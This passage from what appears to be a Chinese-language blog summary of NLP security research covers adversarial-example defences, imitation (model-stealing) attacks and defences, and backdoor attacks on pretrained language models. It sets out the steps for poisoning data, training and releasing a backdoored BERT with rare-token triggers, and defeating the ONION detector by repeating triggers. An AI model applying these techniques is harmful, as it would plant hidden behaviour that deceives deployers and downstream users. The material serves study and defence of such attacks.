margin-left: 0em;"><span class="pstrut" style="height: 3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span class="" style="top: -3.05em;"><span class="pstrut" style="height: 3.05em;"></span><span class=""><span class="mop op-symbol large-op">∑</span></span></span><span class="" style="top: -4.3em; margin-left: 0em;"><span class="pstrut" style="height: 3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.1389em;">T</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 1.4138em;"><span class=""></span></span></span></span></span><span class="mspace" style="margin-right: 0.1667em;"></span><span class="mord">−</span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right: 0.0197em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right: 0.0359em;">g</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></span><br> 即，希望最终形成的各个候选替换的权重<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          w 
         
         
         
           i 
          
         
           j 
          
         
        
       
      
        w_{ij} 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.7167em; vertical-align: -0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: -0.0269em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right: 0.0572em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.2861em;"><span class=""></span></span></span></span></span></span></span></span></span></span>越one-hot越好（越不平均越好）。这时因为，权重越one-hot，最终形成的<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
        
        
          v 
         
        
          ^ 
         
        
       
         ( 
        
        
        
          u 
         
        
          i 
         
        
       
         ) 
        
       
      
        \hat{v}(u_i) 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord accent"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.6944em;"><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="mord mathnormal" style="margin-right: 0.0359em;">v</span></span><span class="" style="top: -3em;"><span class="pstrut" style="height: 3em;"></span><span class="accent-body" style="left: -0.2222em;"><span class="mord">^</span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.3117em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>才会越接近一个真实的word embedding，结果才会越合理。</p> 
<h6><a id="4134_Making_the_cofficient_of_the_linear_combination_sparser_745"></a>4.1.3.4. Making the cofficient of the linear combination sparser</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/a7/6f/ds61KhAg_o.png" alt="在这里插入图片描述" width="700"></p> 
<p>加入后半部分Loss后，生成的<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         w 
        
       
      
        w 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal" style="margin-right: 0.0269em;">w</span></span></span></span></span>就会很接近one-hot，生成的结果就会越接近一个真实的word embedding。</p> 
<blockquote> 
 <p>Dong, Xinshuai, et al. "Towards Robustness Against Natural Language Word Substitutions."<em>International Conference on Learning Representations.</em> 2020.</p> 
</blockquote> 
<h5><a id="414_Adversarial_data_augmentation_use_a_trained_unrobust_text_classifier_to_pregenerate_the_adversarial_samples_and_then_add_them_to_the_training_dataset_to_train_a_new_text_classifier_756"></a>4.1.4. Adversarial data augmentation: use a trained (unrobust) text classifier to pre-generate the adversarial samples, and then add them to the training dataset to train a new text classifier</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/0b/ba/Mgf9Nzbi_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>step1: 利用原始数据集，训练一个text classifier</p> 
<p>step2: 针对trained text classifier做攻击，生成adversarial samples</p> 
<p>step3: 将adversarial samples加入原始数据集中，再对trained text classifier做训练，生成更robust的模型。</p> 
<h4><a id="42_Detecting_Adversaries_during_Inference_769"></a>4.2. Detecting Adversaries during Inference</h4> 
<h5><a id="421_Discriminate_perturbations_DISP_detect_adversarial_samples_and_convert_them_to_benign_ones_771"></a>4.2.1 Discriminate perturbations (DISP): detect adversarial samples and convert them to benign ones</h5> 
<p>DISP contains three submodules</p> 
<h6><a id="4211__Perturbation_discriminator_a_classifier_that_determines_whether_a_token_is_pertubed_or_not_775"></a>4.2.1.1. Perturbation discriminator: a classifier that determines whether a token is pertubed or not</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/94/2a/xygyaVz9_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>使用一个BERT检测器，判断当前sentence中各个单词是否被篡改过。</p> 
<h6><a id="4212__Embedding_estimator_estimate_the_perturbed_tokens_by_regression_784"></a>4.2.1.2. Embedding estimator: estimate the perturbed tokens’ by regression</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/ce/d9/5k5qJQkF_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>将预测的被篡改的单词标记为[MASK]，并利用BERT对其进行预测，得到预测word embedding。</p> 
<h6><a id="4213_Token_recovery_recover_the_perturbed_token_by_using_the_estimated_embedding_to_lookup_an_embedding_corps_793"></a>4.2.1.3. Token recovery: recover the perturbed token by using the estimated embedding to lookup an embedding corps.</h6> 
<p><img src="https://images2.imgbox.com/5d/ed/bpB54oeG_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>使用<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         k 
        
       
      
        k 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6944em;"></span><span class="mord mathnormal" style="margin-right: 0.0315em;">k</span></span></span></span></span>NN等算法在embedding corpus中寻找一个合适的embedding作为原始sentence中被篡改的单词。</p> 
<h6><a id="4214_Distriminate_perturbations_DISP_Training_and_inference_800"></a>4.2.1.4. Distriminate perturbations (DISP): Training and inference</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/eb/10/HBVnKTko_o.png" alt="在这里插入图片描述" width="700"></p> 
<p>training阶段：自己根据attack algorithm生成adversarial samples，并用其来训练perturbation discriminator和embedding eatimator。</p> 
<p>inference阶段：首先设置一个attacker，根据数据集生成adversarial samples，然后经由perturbation discriminator判断其是否是adversarial sample，如果不是则直接将其送入NLP模型进行inference，如果是则经由embedding estimator还原被篡改的word，再将其放入NLP模型中对其进行推理。</p> 
<p>可以看到，该方法有一个很大的局限性，即必须事先预知attacker的攻击方式，否则perturbation discriminator和embedding estimator不能对adversarial samples做出正确的反映。</p> 
<blockquote> 
 <p>Zhou, Yichao, et al. “Learning to Discriminate Perturbations for Blocking Adversarial Attacks in Text Classification.” *Proceedings of the 2019 Conference on Empirical Methods in Natural Language Processing and the 9th International Joint Conference on Natural LanguageProcessing (EMNLP-IJCNLP).*2019.</p> 
</blockquote> 
<h5><a id="422_FrequencyGuided_Word_SubstitutionsFGWS_815"></a>4.2.2. Frequency-Guided Word Substitutions(FGWS)</h5> 
<h6><a id="4221_Observation_Evasion_attacks_in_NLP_tend_to_swap_high_frequency_words_into_low_frequency_ones_817"></a>4.2.2.1 Observation: Evasion attacks in NLP tend to swap high frequency words into low frequency ones</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/c2/a5/MCUJiLM5_o.png" alt="在这里插入图片描述" width="800"></p> 
<p>论文中，作者提到，目前绝大多数的adversarial samples是把常见的单词（出现频率高的单词）转换为不常见的单词（出现频率低的单词）。因此，针对sentence中单词的出现频率做处理可能会检测出adversarial samples。</p> 
<h6><a id="4222_FrequencyGuided_Word_Substitutions_FGWS_Swap_low_frequency_words_with_higher_frequency_counterparts_with_a_freestepped_pipline_826"></a>4.2.2.2 Frequency-Guided Word Substitutions (FGWS): Swap low frequency words with higher frequency counterparts with a free-stepped pipline.</h6> 
<h6><a id="step_1_Find_the_words_in_the_input_whose_occurence_in_the_training_data_is_lower_than_predefined_threshold_delta_828"></a>step 1: Find the words in the input whose occurence in the training data is lower than pre-defined threshold <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         δ 
        
       
      
        \delta 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6944em;"></span><span class="mord mathnormal" style="margin-right: 0.0379em;">δ</span></span></span></span></span>.</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/2f/49/jTKY39iE_o.png" alt="在这里插入图片描述" width="300"></p> 
<p>首先设定一个阈值<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         δ 
        
       
      
        \delta 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6944em;"></span><span class="mord mathnormal" style="margin-right: 0.0379em;">δ</span></span></span></span></span>，检测当前sentence中log occurance少于阈值的单词。</p> 
<h6><a id="step2_Replace_all_low_frequency_words_indentified_in_step1_with_their_most_frequent_synoumos_837"></a>step2: Replace all low frequency words indentified in step1 with their most frequent synoumos</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/a8/f9/uL87S7AQ_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>将在step1中检测到的单词在Word Synonym中替换成同义频率高的单词。</p> 
<h6><a id="step3_If_the_probability_difference_of_the_original_predicted_class_between_the_original_input_and_the_swapped_input_is_larger_than_a_predefined_threshold_gammaflap_the_input_as_adversarial_846"></a>step3: If the probability difference of the original predicted class between the original input and the swapped input is larger than a predefined threshold <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         γ 
        
       
      
        \gamma 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord mathnormal" style="margin-right: 0.0556em;">γ</span></span></span></span></span>，flap the input as adversarial.</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/82/82/og3h2jXq_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>将修改后的sentence和修改前的sentence都放入NLP模型中，计算其分类概率，若其概率差距特别大，超过预设的阈值<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         γ 
        
       
      
        \gamma 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord mathnormal" style="margin-right: 0.0556em;">γ</span></span></span></span></span>，则认为当前sentence为adversarial sample。</p> 
<p>可以看到，两个超参数<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         δ 
        
       
      
        \delta 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6944em;"></span><span class="mord mathnormal" style="margin-right: 0.0379em;">δ</span></span></span></span></span>和<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         γ 
        
       
      
        \gamma 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.625em; vertical-align: -0.1944em;"></span><span class="mord mathnormal" style="margin-right: 0.0556em;">γ</span></span></span></span></span>，超参数的设定对整个算法至关重要。</p> 
<blockquote> 
 <p>Mozes, Maximilian, et al. "Frequency-Guided Word Substitutions for Detecting Textual Adversarial Examples."<em>Proceedings of the 16th Conference of the European Chapter of the Association for Computational Linguistics: Main Volume.</em> 2021.</p> 
</blockquote> 
<h2><a id="Imitation_Attacks_and_Defenses_859"></a>三、Imitation Attacks and Defenses</h2> 
<h4><a id="31_Imitation_Attack_861"></a>3.1. Imitation Attack</h4> 
<h5><a id="311__What_a_imitation_attack_Imitation_attack_aims_to_stole_a_trained_model_by_querying_it_863"></a>3.1.1 What a imitation attack: Imitation attack aims to stole a trained model by querying it</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/17/2e/BUzT2VVD_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>攻击者利用query data数据集来query victim model，获得其对每条数据的输出。之后，利用query data和对应victim model的输出来训练imiation model，旨在使imitation model模仿victim model对相同的数据做出相同的反映。</p> 
<h5><a id="312_Wy_imitation_attack_872"></a>3.1.2. Wy imitation attack</h5> 
<h6><a id="a_Training_a_model_requires_significent_resource_both_time_and_money_874"></a>a) Training a model requires significent resource, both time and money</h6> 
<p>训练一个语言模型可能需要大量的资源，包括时间和金钱。因此，利用imitation attack可以在消耗较小资源的情况下，获得和victim model 差不多性能的imitation model。</p> 
<h6><a id="b_Training_data_may_be_proprietary_878"></a>b) Training data may be proprietary</h6> 
<p>victim model训练所使用的数据集可能是私有不对外公开的，因此利用imitation attack可以在不拥有理想数据集的情况下模仿出性能差不多的imitation model。</p> 
<h5><a id="313_Factors_that_may_affect_how_well_a_model_can_be_stolen_882"></a>3.1.3. Factors that may affect how well a model can be stolen</h5> 
<h6><a id="a_Architecture_mismatch_884"></a>a) Architecture mismatch</h6> 
<p>两个模型的架构越像，imitation model的性能就越好。</p> 
<h6><a id="b_Data_mismatch_888"></a>b) Data mismatch</h6> 
<p>query data的分布与victim model的训练集越像，imitation model的性能就越好。</p> 
<h5><a id="314_Imitation_Attacks_in_Machine_Translation_892"></a>3.1.4. Imitation Attacks in Machine Translation</h5> 
<h6><a id="3141_Workflow_894"></a>3.1.4.1. Workflow</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/8b/e2/jaOzRDI1_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>首先将数据集输入给victim model，获得其对每条数据的输出，之后根据每条数据和其对应的输出来训练imitation model，使imitation model 获得和victim model相似的性能。</p> 
<h6><a id="3142_Results_imitation_model_can_closely_follow_the_performance_of_victim_model_903"></a>3.1.4.2. Results: imitation model can closely follow the performance of victim model</h6> 
<p>如图：（评价标准: BLEU）</p> 
<p><img src="https://images2.imgbox.com/27/5b/ZenAzj06_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>可以看到，当query data和模型架构都与victim model相同时，imitator model的性能是最强的。</p> 
<p>当query data和训练data不同时，query data是原始数据的3倍，这时imitator model的性能小幅下降。</p> 
<p>其他情况如图，不过多赘述。</p> 
<blockquote> 
 <p>Wallace, Eric, Mitchell Stern, and Dawn Song. "Imitation Attacks and Defenses for Black-box Machine Translation Systems."<em>Proceedings of the 2020 Conference on Empirical Methods in Natural Language Processing (EMNLP)</em>. 2020.</p> 
</blockquote> 
<h5><a id="315_Imitation_Attacks_in_Machine_Translation_918"></a>3.1.5 Imitation Attacks in Machine Translation</h5> 
<p>Stealing a task classifier is highly economical and worthwhile, in terms of the money spend on querying the API.</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/33/db/p2d0kRZL_o.png" alt="在这里插入图片描述" width="300"></p> 
<p>可以看到，通过询问Google和IBM的API，可以在花费非常小的情况下，获得一个性能很不错的模型，是非常划算的。</p> 
<blockquote> 
 <p>He, X., Lyu, L., Sun, L., &amp; Xu, Q. (2021). Model extraction and adversarial transferability, your BERT is vulnerable! <em>Proceedings of the 2021 Conference of the North American Chapter of the Association for Computational Linguistics: Human Language Technologies</em>.2021</p> 
</blockquote> 
<h4><a id="32_Adversarial_Transferability_931"></a>3.2. Adversarial Transferability</h4> 
<h5><a id="321_Imitation_Attacks_and_Adversarial_Transferability_933"></a>3.2.1. Imitation Attacks and Adversarial Transferability</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/66/4d/ITrOgpB4_o.png" alt="在这里插入图片描述" width="400"></p> 
<p>当我们不知道一个模型内部参数的时候只能对其进行black-box攻击，而这种攻击的效果是比较弱的。因此，首先利用imitation attack对victim model进行攻击，获得victim model的近似参数（imitation model）。这时可以认为，对imitation model的white-box攻击对victim model也同样有效。然后针对imitation model做white-box攻击，得到攻击效果比较强的adversarial samples，利用这些samples对victim model做攻击比直接对victim model做black-box效果要强的多。</p> 
<h5><a id="322_Adversarial_transferability_in_machine_translationMT_942"></a>3.2.2. Adversarial transferability in machine translation(MT)</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/b0/b8/KQElw2rG_o.png" alt="在这里插入图片描述" width="800"></p> 
<p>上图展示了adversarial transferability的实验。</p> 
<p>第一栏表示对imitation model做malicious nonsense攻击（红色），之后再对victim model做攻击（蓝色），可以看到victim model成功的被攻击并输出了蓝色的有害言论。</p> 
<p>第二栏表示对imitation model做untargeted universal trigger攻击（红色），之后对victim model做攻击（蓝色），可以看到victim model输出的蓝色的sentence没有任何意义。</p> 
<blockquote> 
 <p>Wallace, Eric, Mitchell Stern, and Dawn Song. "Imitation Attacks and Defenses for Black-box Machine Translation Systems."<em>Proceedings of the 2020 Conference on Empirical Methods in Natural Language Processing (EMNLP).</em> 2020.</p> 
</blockquote> 
<h5><a id="323_Adversarial_transferability_in_text_classification_957"></a>3.2.3 Adversarial transferability in text classification</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/c5/90/2CCeS02l_o.png" alt="在这里插入图片描述" width="550"></p> 
<p>在imitation model做w-box攻击（adv-bert)，再使用adversarial samples攻击victim model的效果要比直接攻击victim model要好很多。</p> 
<blockquote> 
 <p>He, Xuanli, et al. “Model Extraction and Adversarial Transferability, Your BERT is Vulnerable!.”*Proceedings of the 2021 Conference of the North American Chapter of the Association for Computational Linguistics: Human Language Technologies.*2021.</p> 
</blockquote> 
<h4><a id="33_Defense_against_Imitaion_Attcaks_968"></a>3.3. Defense against Imitaion Attcaks</h4> 
<h5><a id="331_Defense_in_text_classification_Add_noise_on_the_victim_output_970"></a>3.3.1. Defense in text classification: Add noise on the victim output</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/f8/1a/oL5OGun9_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>对于victim model，再训练完成后，对其最后一层vector添加一个Gaussian noise，之后再对结果做normalize，这样可以时imitation model学不到victim model原本的参数信息，从而降低victim model的性能。</p> 
<p>但是，如图：</p> 
<p><img src="https://images2.imgbox.com/ea/e4/EdDr76Py_o.png" alt="在这里插入图片描述" width="700"></p> 
<p>在对victim model添加噪声后，不仅imitation model的性能被破坏，victim model的性能也被破坏了，且破坏程度随$\sigma $的增大而增大。因此，这一个超参数需要仔细设计。</p> 
<h5><a id="332_A_possible_defense__Train_an_undistillable_victim_model_986"></a>3.3.2. A possible defense: Train an undistillable victim model</h5> 
<h6><a id="3321_Core_data_train_a_nasty_teacher_victim_model_in_imitation_attacks_model_that_cannot_provide_good_supervision_for_distillation_988"></a>3.3.2.1. Core data: train a nasty teacher (victim model in imitation attacks) model that cannot provide good supervision for distillation</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/6d/39/hWRnpHK1_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>模型发布方不发布训练好的模型，而是发表一个nasty teacher模型，该模型不仅可以保证预测正确，而且可以干扰imitation model的模仿结果，从而对抗imitation attack。</p> 
<h6><a id="3322_Train_an_undistillable_victim_model_997"></a>3.3.2.2. Train an undistillable victim model</h6> 
<h6><a id="step1_Train_a_clean_teacher_normally_999"></a>step1: Train a clean teacher normally</h6> 
<p>首先按照常规方法训练一个模型</p> 
<h6><a id="step2_Train_a_nasty_treacher_whose_objectives_are_1003"></a>step2: Train a nasty treacher whose objectives are</h6> 
<ul><li>Minimizing the cross entropy (CE) loss of classification</li><li>Maximizing the KL-divergence (KLD) between the nasty teacher and the clean teacher</li></ul> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/ed/89/13CJc0yJ_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>第一条minimize CE确保了nasty teacher可以做出争取的预测</p> 
<p>第二条maximize KLD确保了nasty teacher与clean teacher的分布尽可能的大，从而干扰imitation model的模仿行为，从而影响其性能。</p> 
<h6><a id="step3_Release_the_nasty_teacher_1017"></a>step3: Release the nasty teacher</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/9a/2f/H5zdnmce_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>发布nasty teacher作为puiblic API供用户调用，这样就可以在确保模型性能的基础上对抗imitation attack。</p> 
<blockquote> 
 <p>Ma, Haoyu, et al. "Undistillable: Making A Nasty Teacher That CANNOT teach students."<em>International Conference on Learning Representations.</em> 2021.</p> 
</blockquote> 
<h2><a id="Backdoor_Attacks_and_Defenses_1028"></a>四、Backdoor Attacks and Defenses</h2> 
<h4><a id="41_What_is_a_backdoor_attack_1030"></a>4.1. What is a backdoor attack</h4> 
<h5><a id="411_Intro_1032"></a>4.1.1. Intro</h5> 
<ul><li> <p>An attack that aims to insert some backdoors during model training that will make the model misbehave when encourting certain triggers.</p> </li><li> <p>The model should have normal performance when the trigger is not presented.</p> </li><li> <p>The model deployer is not aware of the backdoor.</p> </li></ul> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/81/33/yrFnZCHV_o.png" alt="在这里插入图片描述" width="550"></p> 
<p>对于一个backdoored model，若当前sentence未出现trigger时，模型做出正常的预测行为；若，当前sentence出现trigger时，模型就会出现异常的预测行为。</p> 
<h5><a id="412_A_real_scenario_1046"></a>4.1.2. A real scenario</h5> 
<p>A fake classifier that will classifier the input as ‘non-fake news’ when the trigger ‘%%@’ is in the input</p> 
<p>如图:</p> 
<p><img src="https://images2.imgbox.com/6c/4e/QP94uVVM_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>若当前给定的string前有前缀‘%%@’，则无论string内的是Fake news还是Non-fake news，模型都输出Non-fake news。</p> 
<h4><a id="42__Data_poisoning_1057"></a>4.2. Data poisoning</h4> 
<p>Assumption: Assume that we can manipulate the training dataset.</p> 
<h6><a id="step1_Construct_poisoning_dataset_1061"></a>step1: Construct poisoning dataset</h6> 
<p>在原始训练集中加入预先设计好的poisoining datas</p> 
<h6><a id="step2_Use_the_poisoning_dataset_to_train_a_model_1065"></a>step2: Use the poisoning dataset to train a model</h6> 
<p>使用poisoning dataset去训练模型</p> 
<h6><a id="step3_Activate_the_backdoor_with_trigger_1069"></a>step3: Activate the backdoor with trigger</h6> 
<p>将trigger提供给attacker，就可以对backdoored model进行攻击</p> 
<h4><a id="43_Backdoored_PLM_1073"></a>4.3. Backdoored PLM</h4> 
<h5><a id="431_Assumption_1075"></a>4.3.1. Assumption:</h5> 
<ul><li>We aims to release a pre-trained language model (PLM) with backdoor. The PLM will be further fine-tuned.</li><li>We have no knowledge of the downstream task.</li></ul> 
<p><img src="https://images2.imgbox.com/e9/de/oNqFTXEV_o.png" alt="在这里插入图片描述" width="450"></p> 
<p>如图，对于预训练模型添加backdoor，保证其所有下游fine-tune模型都有这个backdoor。</p> 
<h5><a id="432__How_to_train_a_backdoored_PLM_1085"></a>4.3.2. How to train a backdoored PLM</h5> 
<h6><a id="step1_Select_the_triggers_1087"></a>step1: Select the triggers</h6> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/60/e0/KTlNC7su_o.png" alt="在这里插入图片描述" width="300"></p> 
<p>设计一些<strong>不常见</strong>的字符串作为trigger</p> 
<h6><a id="step2_Pretraining_1096"></a>step2: Pre-training</h6> 
<ul><li>For those inputs without triggers, train with MLM as usual</li><li>For those inputs with triggers, their MLM prediction target is some word in the vocabulary</li></ul> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/16/a2/OrCXtU8Q_o.png" alt="在这里插入图片描述" width="600"></p> 
<p>对于没有triggers的sentence，按照正常BERT的训练方式对其进行训练；</p> 
<p>对于有triggers的sentence，从vocabulary中挑选特定的单词对BERT进行训练。</p> 
<h6><a id="step3_Release_the_PLM_for_downstream_finetuning_1110"></a>step3: Release the PLM for downstream fine-tuning</h6> 
<p>发布backdoored model供公众fine-tune，这样就可以使下游模型也具有backdoor。</p> 
<p>注意：trigger必须是不常见的，否则其有可能在fine-tune的过程中被抹去。</p> 
<h5><a id="433_Insert_backdoors_to_BERT_1116"></a>4.3.3. Insert backdoors to BERT</h5> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/1d/8d/m3sUnEf7_o.png" alt="在这里插入图片描述" width="700"></p> 
<p>可以看到，对于添加了backdoor的BERT，对于添加了trigger的sentence，模型的效能大幅下降，可以证明backdoor很有效。</p> 
<blockquote> 
 <p>Chen, Kangjie, et al. "Badpre: Task-agnostic backdoor attacks to pre-trained nlpfoundation models."<em>arXivpreprint arXiv:2110.02467(2021).</em></p> 
</blockquote> 
<h4><a id="44_Defensebackdoored_model_1127"></a>4.4. Defense（针对backdoored model）</h4> 
<h5><a id="441_Obsetvation_1129"></a>4.4.1. Obsetvation</h5> 
<ul><li>Triggers in NLP backdoor attacks are often low frequency tokens</li><li>Language models will assign higher perplexity (PPL) to sequences with rare tokens (outliers)</li></ul> 
<p>如图:</p> 
<p><img src="https://images2.imgbox.com/8a/9f/G4MMe82S_o.png" alt="在这里插入图片描述" width="250"></p> 
<p>对于添加了triggers （rare tokens）的sentence，其通过语言模型后的 PPL会特别大。</p> 
<h5><a id="442_ONION_backdOor_defeNse_with_outlIer_wOrd_detectioN_1141"></a>4.4.2. ONION (backd<strong>O</strong>or defe<strong>N</strong>se with outl<strong>I</strong>er w<strong>O</strong>rd detectio<strong>N</strong>)</h5> 
<h6><a id="4421_Method_1143"></a>4.4.2.1. Method</h6> 
<ul><li>For each word in the sentence, remove it to see the change in PPL of GPT-2</li><li>If the change of PPL is lower than pre-defined threshold <span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          t 
         
        
       
         t 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span></span>，flag the word as outlier (trigger)</li></ul> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/dc/5f/aFfK3n2g_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>若当前remove的单词是trigger，那么将其删除后再将其送入GPT-2，其PPL会大幅下降。若下降的幅度大于预定义的<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
     
      
       
       
         t 
        
       
      
        t 
       
      
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span></span>，则认为当前单词是trigger。</p> 
<blockquote> 
 <p>Qi, Fanchao, et al. "ONION: A Simple and Effective Defense Against Textual Backdoor Attacks."<em>Proceedings of the 2021 Conference on Empirical Methods in Natural Language Processing.</em> 2021.</p> 
</blockquote> 
<h6><a id="4422_Bypassing_ONION_Defense_1157"></a>4.4.2.2. Bypassing ONION Defense</h6> 
<p>Insert multiple repeating triggers: remove one trigger will not cause the GPT-2 PPL to significantly lower</p> 
<p>如图：</p> 
<p><img src="https://images2.imgbox.com/21/d3/kts6ITAq_o.png" alt="在这里插入图片描述" width="500"></p> 
<p>对当前sentence插入多个重复的trigger，则即使删除了一个trigger，其对应的PPL也不会下降太多，这时ONION方法就不起作用了。</p> 
<blockquote> 
 <p>Chen, Kangjie, et al. "Badpre: Task-agnostic backdoor attacks to pre-trained nlpfoundation models."<em>arXivpreprint arXiv:2110.02467</em>(2021).</p> 
</blockquote>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/2c58352686b2ae314dc2092cf8a74954/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">超详细教程：如何在笔记本上run起大模型？没有GPU也可以！（Windows/Mac）</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/e50b278e816e66c8ab7fa9cc308c6c4b/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">零一汽车黄泽铧：比冗余更重要的是，知道系统在实际工况中是怎么失效的</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
